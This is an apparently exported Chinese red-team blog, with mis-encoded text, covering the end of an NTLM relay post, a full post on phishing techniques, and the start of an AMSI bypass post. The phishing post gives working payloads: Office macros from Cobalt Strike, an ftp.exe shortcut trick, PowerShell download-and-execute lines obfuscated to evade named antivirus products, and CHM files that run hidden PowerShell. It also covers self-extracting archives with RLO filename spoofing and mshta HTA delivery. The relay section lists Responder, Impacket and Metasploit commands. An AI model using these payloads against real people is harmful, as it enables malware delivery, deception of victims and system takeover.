<h4 id="æ”»å‡»æ¼”ç¤º"><a href="#æ”»å‡»æ¼”ç¤º" class="headerlink" title="æ”»å‡»æ¼”ç¤º"></a>æ”»å‡»æ¼”ç¤º</h4><p>dc winsercer 2012<br>åŸŸå†…æœºå™¨ winserver 2008 å‡ºç½‘    kali  frpè¿è¿›æ¥<br>å‚è€ƒ <a href="https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/RedTeam/OS%E5%AE%89%E5%85%A8/%E5%AE%9E%E9%AA%8C/NTLM%E4%B8%AD%E7%BB%A7.md">https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/RedTeam/OS%E5%AE%89%E5%85%A8/%E5%AE%9E%E9%AA%8C/NTLM%E4%B8%AD%E7%BB%A7.md</a></p>
<h5 id="Responderä¸­çš„MultiRelayx-py"><a href="#Responderä¸­çš„MultiRelayx-py" class="headerlink" title="Responderä¸­çš„MultiRelayx.py"></a>Responderä¸­çš„MultiRelayx.py</h5><p>åˆ©ç”¨ MultiRelay.py æ”»å‡»ï¼Œè·å¾—ç›®æ ‡ä¸»æœºçš„ shellï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 MultiRelay.py -t &lt;è¢«æ”»å‡»ip&gt; -u ALL</span><br></pre></td></tr></table></figure>


<h5 id="Impacketä¸­çš„smbrelayx-py"><a href="#Impacketä¸­çš„smbrelayx-py" class="headerlink" title="Impacketä¸­çš„smbrelayx.py"></a>Impacketä¸­çš„smbrelayx.py</h5><p><code>impacket-smbrelayx -h &lt;è¢«æ”»å‡»ip&gt; -c whoami</code></p>
<p>å›¾ç‰‡</p>
<p>è®©ä»»æ„ä¸»æœºè®¿é—®è¿™ä¸ªæ”»å‡»è€…ç²¾å¿ƒæ„é€ å¥½çš„ SMB æœåŠ¡å™¨ï¼š</p>
<p><code>net use \\&lt;kali IP&gt;</code></p>
<h5 id="Impcaketä¸­çš„ntlmrelayx-py"><a href="#Impcaketä¸­çš„ntlmrelayx-py" class="headerlink" title="Impcaketä¸­çš„ntlmrelayx.py"></a>Impcaketä¸­çš„ntlmrelayx.py</h5><p>ntlmrelayx è„šæœ¬å¯ä»¥ç›´æ¥ç”¨ç°æœ‰çš„ hash å»å°è¯•é‡æ”¾æŒ‡å®šçš„æœºå™¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-ntlmrelayx -t smb://&lt;è¢«æ”»å‡»ip&gt; -c whoami -smb2support</span><br></pre></td></tr></table></figure>

<h5 id="Metasploitä¸­çš„smb-relayæ¨¡å—ï¼ˆms08-068ï¼‰"><a href="#Metasploitä¸­çš„smb-relayæ¨¡å—ï¼ˆms08-068ï¼‰" class="headerlink" title="Metasploitä¸­çš„smb_relayæ¨¡å—ï¼ˆms08-068ï¼‰"></a>Metasploitä¸­çš„smb_relayæ¨¡å—ï¼ˆms08-068ï¼‰</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/smb_relay</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>åœ¨ç›®æ ‡çš„ cmd ä¸­æ‰§è¡Œ <code>net use \\&lt;kali ip&gt;\c$</code> æ¥è®¿é—®æ”»å‡»è€…æ­å»ºçš„æ¶æ„ smb æœåŠ¡</p>
<hr>
<h3 id="LDAPä¸­ç»§æ”»å‡»"><a href="#LDAPä¸­ç»§æ”»å‡»" class="headerlink" title="LDAPä¸­ç»§æ”»å‡»"></a>LDAPä¸­ç»§æ”»å‡»</h3><h3 id="Exchangeä¸­ç»§æ”»å‡»"><a href="#Exchangeä¸­ç»§æ”»å‡»" class="headerlink" title="Exchangeä¸­ç»§æ”»å‡»"></a>Exchangeä¸­ç»§æ”»å‡»</h3><h3 id="ä¸­ç»§æ”»å‡»é˜²å¾¡æªæ–½"><a href="#ä¸­ç»§æ”»å‡»é˜²å¾¡æªæ–½" class="headerlink" title="ä¸­ç»§æ”»å‡»é˜²å¾¡æªæ–½"></a>ä¸­ç»§æ”»å‡»é˜²å¾¡æªæ–½</h3><p>1.SMBä¸­ç»§ä¸ºæ»¥ç”¨NTLMèº«ä»½éªŒè¯åè®®ï¼Œæ‰€ä»¥å¹²è„†åˆ©è½ï¼Œå®Œå…¨ç¦ç”¨NTLMï¼Œåˆ‡æ¢åˆ°ç›¸å¯¹å®‰å…¨çš„ Kerberosï¼Œå½“ç„¶ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œç›¸å¯¹æ—§çš„æ“ä½œç³»ç»Ÿä¸æ”¯æŒKerberosèº«ä»½éªŒè¯ã€‚</p>
<p>2.å¯ç”¨SMBç­¾åï¼ŒSMBç­¾åå°†é€šè¿‡å¯¹æ‰€æœ‰æµé‡è¿›è¡Œç­¾åæ¥é˜²æ­¢ä¸­ç»§åˆ°SMBï¼Œç”±äºç­¾åéœ€è¦ç”¨æˆ·å¯†ç æ¥éªŒè¯æ¶ˆæ¯ï¼Œè€Œæ”»å‡»è€…æ²¡æœ‰å—å®³è€…çš„å¯†ç ï¼Œå› æ­¤ä¸­ç»§æ”»å‡»è€…æ— æ³•å‘é€æœåŠ¡å™¨å°†æ¥æ”¶çš„ä»»ä½•æµé‡ï¼Œç›¸å¯¹æ›´å®‰å…¨ã€‚</p>
<hr>
<h3 id="NTLMåå°„"><a href="#NTLMåå°„" class="headerlink" title="NTLMåå°„"></a>NTLMåå°„</h3><h4 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h4><h4 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><hr>
<h3 id="Potatoå®¶æ—åˆ†æ"><a href="#Potatoå®¶æ—åˆ†æ" class="headerlink" title="Potatoå®¶æ—åˆ†æ"></a>Potatoå®¶æ—åˆ†æ</h3><h4 id="Origin-Potato-MS08-068"><a href="#Origin-Potato-MS08-068" class="headerlink" title="Origin Potato_MS08-068"></a>Origin Potato_MS08-068</h4><h4 id="CVE-2019-1384-Ghost-potato"><a href="#CVE-2019-1384-Ghost-potato" class="headerlink" title="CVE-2019-1384_Ghost potato"></a>CVE-2019-1384_Ghost potato</h4><hr>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><blockquote>
<p><a href="https://xz.aliyun.com/t/1943">https://xz.aliyun.com/t/1943</a><br><a href="https://www.xiinnn.com/article/90eaacf3.html">https://www.xiinnn.com/article/90eaacf3.html</a><br><a href="https://juejin.cn/post/6952793401460949029">https://juejin.cn/post/6952793401460949029</a><br><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/4#0x03-net-ntlm-hash">https://daiker.gitbook.io/windows-protocol/ntlm-pian/4#0x03-net-ntlm-hash</a><br><a href="http://davenport.sourceforge.net/ntlm.html">http://davenport.sourceforge.net/ntlm.html</a><br><a href="https://zhuanlan.zhihu.com/p/372961591">https://zhuanlan.zhihu.com/p/372961591</a><br><a href="https://blog.csdn.net/qq_41874930/article/details/108825010">https://blog.csdn.net/qq_41874930/article/details/108825010</a><br><a href="https://mp.weixin.qq.com/s/aemG5XwVdyzNbOBXztDUbA">https://mp.weixin.qq.com/s/aemG5XwVdyzNbOBXztDUbA</a><br><a href="https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/RedTeam/OS%E5%AE%89%E5%85%A8/%E5%AE%9E%E9%AA%8C/NTLM%E4%B8%AD%E7%BB%A7.md">https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/RedTeam/OS%E5%AE%89%E5%85%A8/%E5%AE%9E%E9%AA%8C/NTLM%E4%B8%AD%E7%BB%A7.md</a><br><a href="https://hetian.blog.csdn.net/article/details/106330021">https://hetian.blog.csdn.net/article/details/106330021</a><br><a href="https://www.freebuf.com/articles/network/244375.html">https://www.freebuf.com/articles/network/244375.html</a><br><a href="https://blog.csdn.net/qq_41874930/article/details/108825010#SSPI_26">https://blog.csdn.net/qq_41874930/article/details/108825010#SSPI_26</a><br><a href="https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/RedTeam/OS%E5%AE%89%E5%85%A8/%E5%AE%9E%E9%AA%8C/Responder%E6%AC%BA%E9%AA%97.md">https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/RedTeam/OS%E5%AE%89%E5%85%A8/%E5%AE%9E%E9%AA%8C/Responder%E6%AC%BA%E9%AA%97.md</a><br><a href="https://redhatzone.com/ask/article/1459.html">https://redhatzone.com/ask/article/1459.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>NTLM</category>
      </categories>
      <tags>
        <tag>NTLM</tag>
      </tags>
  </entry>
  <entry>
    <title>å¸¸è§é’“é±¼æ€è·¯æ€»ç»“</title>
    <url>/posts/7057a17a/</url>
    <content><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>æœ¬æ–‡åªè®°è½½ä¸€ä¸‹é’“é±¼ç”¨åˆ°çš„å‡ ç§æ€è·¯ï¼Œå…·ä½“å…æ€å…ˆæš‚ä¸è€ƒè™‘</p>
<br>

<h3 id="wordå®é’“é±¼"><a href="#wordå®é’“é±¼" class="headerlink" title="wordå®é’“é±¼"></a>wordå®é’“é±¼</h3><p>åˆ›å»ºä¸€ä¸ªlistner</p>
<p><img src="/posts/7057a17a/1.png" alt="æˆªå›¾"></p>
<p>é€‰æ‹© Attacks -&gt; MS Office Macro é€‰æ‹©åˆšæ‰åˆ›å»ºçš„listener -&gt; Generate</p>
<p>ç„¶åé€‰æ‹© Copy Macro</p>
<p><img src="/posts/7057a17a/2.png" alt="æˆªå›¾"></p>
<br>

<p>æ‰“å¼€word ç‚¹å‡»é€‰é¡¹-&gt;å¼€å‘æ”»å‡»  æ‰“å‹¾</p>
<p><img src="/posts/7057a17a/3.png" alt="æˆªå›¾"></p>
<p>ä¿å­˜åæ–°å»ºä¸€ä¸ªwordæ–‡ä»¶  é€‰æ‹©å¼€å‘å·¥å…·ï¼Œç„¶åæ‰“å¼€ Visual Basic</p>
<p><img src="/posts/7057a17a/4.png" alt="æˆªå›¾"></p>
<p><img src="/posts/7057a17a/5.png" alt="æˆªå›¾"></p>
<p>Ctrl +S ä¿å­˜</p>
<p><img src="/posts/7057a17a/6.png" alt="æˆªå›¾"></p>
<p>ç„¶åä¼šå¼¹æ¡† é€‰æ‹© æ˜¯</p>
<p><img src="/posts/7057a17a/7.png" alt="æˆªå›¾"></p>
<p>ç„¶åä¿å­˜é€€å‡º å†æ‰“å¼€æ—¶é€‰æ‹©å¯ç”¨ å°±ä¼šä¸Šçº¿åˆ°CS</p>
<br>

<br>

<h3 id="Linké“¾æ¥é’“é±¼"><a href="#Linké“¾æ¥é’“é±¼" class="headerlink" title="Linké“¾æ¥é’“é±¼"></a>Linké“¾æ¥é’“é±¼</h3><p>ftp åŠ  ï¼å¯ä»¥æ‰§è¡Œå‘½ä»¤</p>
<p><img src="/posts/7057a17a/8.png" alt="æˆªå›¾"></p>
<br>

<p>é¦–å…ˆå…ˆåˆ›å»ºä¸€ä¸ªftpçš„å¿«æ·æ–¹å¼ï¼Œç„¶åæ–°å»ºä¸€ä¸ªæ–‡ä»¶åaaa.dllï¼Œç„¶åé€šè¿‡aaa.dllå»è°ƒç”¨bbb.ps1 ç„¶åä¸Šçº¿</p>
<p>å¿«æ·æ–¹å¼çš„èµ·å§‹ä½ç½®ç•™ç©ºï¼Œç›®æ ‡ä¸º<code>C:\Windows\System32\ftp.exe -&quot;&quot;s:aaa.dll</code></p>
<p><img src="/posts/7057a17a/9.png" alt="æˆªå›¾"></p>
<br>

<p>åœ¨CSä¸­é€‰æ‹© Attack -&gt; Scripted Wed Delivery(s)</p>
<p><img src="/posts/7057a17a/10.png" alt="æˆªå›¾"></p>
<br>

<p><img src="/posts/7057a17a/11.png" alt="æˆªå›¾"></p>
<br>

<p><img src="/posts/7057a17a/12.png" alt="æˆªå›¾"></p>
<p>aaa.dll</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!cmd /k powershell -exec bypass .\bbb.ps1</span><br></pre></td></tr></table></figure>

<p>bbb.ps1(ç›´æ¥ç¬¬ä¸‰æ–¹è°ƒç”¨powershellåŠ å‚ä¼šè¢«360ç­‰æ‹¦æˆªï¼Œé‡‡ç”¨æ— å‚è°ƒç”¨)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.43.87:80/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>

<p>ç®€å•æ··æ·†ä¸‹ å°±å¯ä»¥è¿‡360å’Œç«ç»’ ä½†æ˜¯è¿è¡Œåä¼šæœ‰ä¸€ä¸ªé»‘æ¡†ï¼Œé€‰æ‹©ä¸ºæœ€å°åŒ–</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ds=&quot;Down&quot;+&quot;loadString&quot;;</span><br><span class="line">Invoke-Expression (New-Object Net.WebClient).$ds.Invoke(&#x27;h&#x27;+&#x27;ttp://192.168.43.87:80/a&#x27;)</span><br></pre></td></tr></table></figure>

<p><img src="/posts/7057a17a/13.png" alt="æˆªå›¾"></p>
<br>

<h3 id="Linkå¿«æ·æ–¹å¼é’“é±¼"><a href="#Linkå¿«æ·æ–¹å¼é’“é±¼" class="headerlink" title="Linkå¿«æ·æ–¹å¼é’“é±¼"></a>Linkå¿«æ·æ–¹å¼é’“é±¼</h3><br>

<br>

<h3 id="CHMæ–‡æ¡£é’“é±¼"><a href="#CHMæ–‡æ¡£é’“é±¼" class="headerlink" title="CHMæ–‡æ¡£é’“é±¼"></a>CHMæ–‡æ¡£é’“é±¼</h3><p>ä½¿ç”¨ EasyCHM å¯ä»¥è½»æ¾çš„æ–°å»ºä¸€ä¸ª chm æ–‡ä»¶ï¼Œé¦–å…ˆæ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œç„¶ååœ¨æ–‡ä»¶å¤¹ä¸­æ–°å»ºä¸€ä¸ª html æ–‡ä»¶ï¼Œhtml ä»£ç å¦‚ä¸‹ã€‚å¯ä»¥åˆ©ç”¨jsï¼ˆjscriptï¼‰è°ƒç”¨comæ§ä»¶æ‰§è¡Œå‘½ä»¤</p>
<p>1.åˆ›å»ºä¸€ä¸ªåä¸ºchmçš„æ–‡ä»¶å¤¹ ç„¶ååˆ›å»ºä¸€ä¸ª1.html ä»£ç å¦‚ä¸‹</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Mousejack replay<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">command exec </span><br><span class="line"><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;,calc.exe&#x27;</span>&gt;</span> //payloadå‰é¢è¦åŠ ä¸€ä¸ªè‹±æ–‡ç‰ˆçš„é€—å· , å¦åˆ™æ‰“å¼€chmæ–‡æ¡£æ—¶ä¼šå‡ºé”™</span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;273,1,1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line">x.Click();</span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<p>ä½¿ç”¨easychmåˆ›å»ºä¸€ä¸ªchmæ–‡æ¡£  æ–°å»ºå·¥ç¨‹</p>
<br>

<p><img src="/posts/7057a17a/14.png" alt="æˆªå›¾"></p>
<p>è¿›è¡Œç¼–è¯‘ ç”ŸæˆCHM</p>
<p><img src="/posts/7057a17a/15.png" alt="æˆªå›¾"></p>
<p>ç„¶åå¾—åˆ°ä¸€ä¸ªchm.CHM</p>
<p><img src="/posts/7057a17a/16.png" alt="æˆªå›¾"></p>
<p>åŒå‡»è¿è¡Œ ä¾¿ä¼šå¼¹å‡ºä¹‹å‰æµ‹è¯•çš„calc</p>
<p><img src="/posts/7057a17a/17.png" alt="æˆªå›¾"></p>
<br>

<p>å¯ä»¥ä½¿ç”¨åŒæ ·çš„æ–¹å¼å»ä¸Šçº¿åˆ°CSä¸Š  æ›¿æ¢1.htmlä¸­ payloadå¤„çš„ä»£ç å³å¯</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Mousejack replay<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">command exec </span><br><span class="line"><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;,powershell.exe, -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x:80/test&#x27;))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;273,1,1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line">x.Click();</span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/posts/7057a17a/18.png" alt="æˆªå›¾"></p>
<p>è¿™é‡Œè¦å†powershell.exeååŠ ä¸€ä¸ª<code>,</code> å¦åˆ™æ— æ³•æˆåŠŸä¸Šçº¿</p>
<p><img src="/posts/7057a17a/19.png" alt="æˆªå›¾"></p>
<p>ç„¶åç”Ÿæˆçš„.chmæ–‡ä»¶è¿è¡Œååœ¨æœ¬æœºå’Œè™šæ‹Ÿæœºå‡æˆåŠŸä¸Šçº¿ï¼Œä½†æ˜¯å®æˆ˜æ—¶è¦è€ƒè™‘å…æ€</p>
<p><img src="/posts/7057a17a/20.png" alt="æˆªå›¾"></p>
<br>

<br>

<h3 id="è‡ªè§£å‹é’“é±¼"><a href="#è‡ªè§£å‹é’“é±¼" class="headerlink" title="è‡ªè§£å‹é’“é±¼"></a>è‡ªè§£å‹é’“é±¼</h3><p>å°†è¦å‹ç¼©çš„è½¯ä»¶ä¸€èµ·ä½¿ç”¨win.rarè¿›è¡Œå‹ç¼©</p>
<p><img src="/posts/7057a17a/21.png" alt="1649405822(1).png"></p>
<p>ç‚¹å‡» é«˜çº§  â€“&gt; è‡ªè§£å‹é€‰é¡¹</p>
<p><img src="/posts/7057a17a/22.png" alt="æˆªå›¾"></p>
<br>

<p>åœ¨å¸¸è§„ä¸­ æ·»åŠ è§£å‹è·¯å¾„ <code>C:\Windows\Temp</code></p>
<p><img src="/posts/7057a17a/23.png" alt="æˆªå›¾"></p>
<p>ç‚¹å‡» â€œè®¾ç½®â€  </p>
<p><img src="/posts/7057a17a/24.png" alt="æˆªå›¾"></p>
<br>

<p>ç‚¹å‡» â€œæ¨¡å¼â€ â€“&gt; å…¨éƒ¨éšè—</p>
<p><img src="/posts/7057a17a/25.png" alt="æˆªå›¾"></p>
<p>ç‚¹å‡» â€œæ›´æ–°â€ è®¾ç½® æ›´æ–°æ¨¡å¼â€”è§£å‹å¹¶æ›´æ–°æ–‡ä»¶     è¦†ç›–æ¨¡å¼â€”è¦†ç›–æ‰€æœ‰æ–‡ä»¶</p>
<p><img src="/posts/7057a17a/26.png" alt="æˆªå›¾"></p>
<p>ç„¶åç‚¹å‡»ç¡®å®š å°±ä¼šç”Ÿæˆä¸€ä¸ª fish.exeçš„è‡ªè§£å‹æ–‡ä»¶ ä½¿ç”¨Restoratoræ›´æ¢ä¸€ä¸ªå›¾æ ‡</p>
<p><img src="/posts/7057a17a/27.png" alt="æˆªå›¾"></p>
<p>ç„¶åå¾—åˆ°</p>
<p><img src="/posts/7057a17a/28.png" alt="æˆªå›¾"></p>
<p>ç„¶åä½¿ç”¨RLOå»ä¼ªè£…æ–‡ä»¶å</p>
<p><img src="/posts/7057a17a/29.png" alt="æˆªå›¾"></p>
<p>ç„¶ååœ¨assåé¢å³é”® æ’å…¥unicodeæ§åˆ¶å­—ç¬¦ä½¿ç”¨RLO</p>
<p><img src="/posts/7057a17a/30.png" alt="æˆªå›¾"></p>
<p>ç„¶åå†æ‰“å¼€åå°±ä¼šè¿è¡Œpdfæ–‡ä»¶å’Œcalc å®æˆ˜çš„è¯å¯ä»¥æŠŠcalc.exeæ¢æˆå…æ€é©¬ï¼Œä½†æ˜¯ç°åœ¨è‡ªè§£å‹å’ŒRLOéƒ½å·²ç»è¢«360æ ‡è®°ä¸ºäº†æ¶æ„æ–‡ä»¶ã€‚</p>
<br>

<h3 id="HTAé’“é±¼"><a href="#HTAé’“é±¼" class="headerlink" title="HTAé’“é±¼"></a>HTAé’“é±¼</h3><p>HTA æ˜¯ HTML Application çš„ç¼©å†™ï¼Œç›´æ¥å°† HTML ä¿å­˜æˆ HTA çš„æ ¼å¼ï¼Œæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„åº”ç”¨è½¯ä»¶ã€‚HTA è™½ç„¶ç”¨ HTMLã€JS å’Œ CSS ç¼–å†™ï¼Œå´æ¯”æ™®é€šç½‘é¡µæƒé™å¤§å¾—å¤šï¼Œå®ƒå…·æœ‰æ¡Œé¢ç¨‹åºçš„æ‰€æœ‰æƒé™ã€‚å°±æ˜¯ä¸€ä¸ª html åº”ç”¨ç¨‹åºï¼ŒåŒå‡»å°±èƒ½è¿è¡Œ</p>
<br>

<p>Cobalt Strikeï¼Œattacksâ€”â€”&gt;packagesâ€”â€”&gt;HTML application</p>
<p><img src="/posts/7057a17a/31.png" alt="æˆªå›¾"></p>
<p>ç”Ÿæˆä¸€ä¸ª.htaæ–‡ä»¶ï¼Œç„¶åè¿è¡Œå°±ä¼šä¸Šçº¿</p>
<br>

<br>

<p>æ­£å¸¸æ˜¯msfç”Ÿæˆçš„htaæ–‡ä»¶å¼¹shellï¼Œå‡è®¾ç›®æ ‡å­˜åœ¨å‘½ä»¤æ‰§è¡Œçš„æ¼æ´, é‚£ä¹ˆå’±ä»¬åœ¨ç›®æ ‡ä¸Šæ‰§è¡Œå¦‚ä¸‹å³å¯è¿”å›msfçš„shell<br><code>mshta http://127.0.0.1:8080/3IJ2zPDMiAm4.hta</code>  (koadicä¹Ÿæ˜¯ç”¨åˆ°mshtaè¿™ç§æ–¹å¼å»ä¸Šçº¿çš„)<br>è¿œç¨‹è°ƒç”¨ä¸€èˆ¬éƒ½ä¼šè¢«æ€ï¼Œæœ€å¥½æœ¬åœ°è¿è¡Œ</p>
<br>

<hr>
<h3 id="Gophishé‚®ä»¶é’“é±¼"><a href="#Gophishé‚®ä»¶é’“é±¼" class="headerlink" title="Gophishé‚®ä»¶é’“é±¼"></a>Gophishé‚®ä»¶é’“é±¼</h3><p>éœ€è¦ä¸€å°æœåŠ¡å™¨ä½œä¸ºGophish</p>
<h4 id="ç¯å¢ƒéƒ¨ç½²"><a href="#ç¯å¢ƒéƒ¨ç½²" class="headerlink" title="ç¯å¢ƒéƒ¨ç½²"></a>ç¯å¢ƒéƒ¨ç½²</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://github.com/gophish/gophish/releases/download/v0.11.0/gophish-v0.11.0-linux-64bit.zip</span><br><span class="line">unzip  gophish-v0.11.0-linux-64bit.zip</span><br><span class="line"></span><br><span class="line"># ä¿®æ”¹config.json  ä¿®æ”¹admin_server çš„ 127.0.0.1 =&gt; 0.0.0.0</span><br><span class="line"># å¯è‡ªå®šä¿®æ”¹å¯¹åº”ç«¯å£</span><br><span class="line">sudo vim config.json</span><br><span class="line"></span><br><span class="line">sudo chmod +x ./gophish</span><br><span class="line">gophish</span><br><span class="line"></span><br><span class="line">è®¿é—®https://ip:port</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h4><p>â€¦â€¦.</p>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><blockquote>
<p><a href="https://www.freebuf.com/articles/web/325322.html">https://www.freebuf.com/articles/web/325322.html</a></p>
<p><a href="https://www.freebuf.com/articles/network/267251.html">https://www.freebuf.com/articles/network/267251.html</a></p>
<p><a href="https://www.ddosi.org/trojan-hidden/">https://www.ddosi.org/trojan-hidden/</a></p>
<p><a href="https://xz.aliyun.com/t/10339">https://xz.aliyun.com/t/10339</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>AMSI Bypasså­¦ä¹ </title>
    <url>/posts/9af7df1e/</url>
    <content><![CDATA[<h3 id="AMSI"><a href="#AMSI" class="headerlink" title="AMSI"></a>AMSI</h3><p>AMSIå…¨ç§°(Antimalware Scan Interface)ï¼Œåæ¶æ„è½¯ä»¶æ‰«ææ¥å£ï¼Œä»–çš„æœ¬ä½“æ˜¯ä¸€ä¸ªDLLæ–‡ä»¶ï¼Œåœ¨Windows Server 2016å’ŒWin10ä¸Šå·²ç»é»˜è®¤å®‰è£…å¹¶å¯ç”¨ã€‚é»˜è®¤ä½ç½®ï¼š<code>c:\windows\system32\amsi.dll</code></p>
<p>å®ƒæä¾›äº†é€šç”¨çš„æ ‡å‡†æ¥å£(Win32 API COMæ¥å£)</p>
<p>WIN32 APIä¸ºæ­£å¸¸åº”ç”¨ç¨‹åºç¨‹åº ï¼ŒCOM æ¥å£ä¸ºä¸€äº›æ€è½¯å‚å•†æä¾›ã€‚ï¼ˆå›½å†…çš„æ€è½¯åŸºæœ¬ä¸Šéƒ½ä¸è°ƒç”¨è¿™ä¸ªamsiï¼‰</p>
<p>AMSI ä¸ä»…ç”¨äºæ‰«æè„šæœ¬ã€ä»£ç ã€å‘½ä»¤æˆ– cmdletï¼Œè¿˜å¯ä»¥ç”¨äºæ‰«æä»»ä½•æ–‡ä»¶ã€å†…å­˜æˆ–æ•°æ®æµï¼Œä¾‹å¦‚å­—ç¬¦ä¸²ã€å³æ—¶æ¶ˆæ¯ã€å›¾ç‰‡æˆ–è§†é¢‘ã€‚</p>
<br>

<p>ç›®å‰åœ¨ Windows 10 ä¸Šå®ç° AMSI çš„æ‰€æœ‰ç»„ä»¶çš„åˆ—è¡¨ï¼š</p>
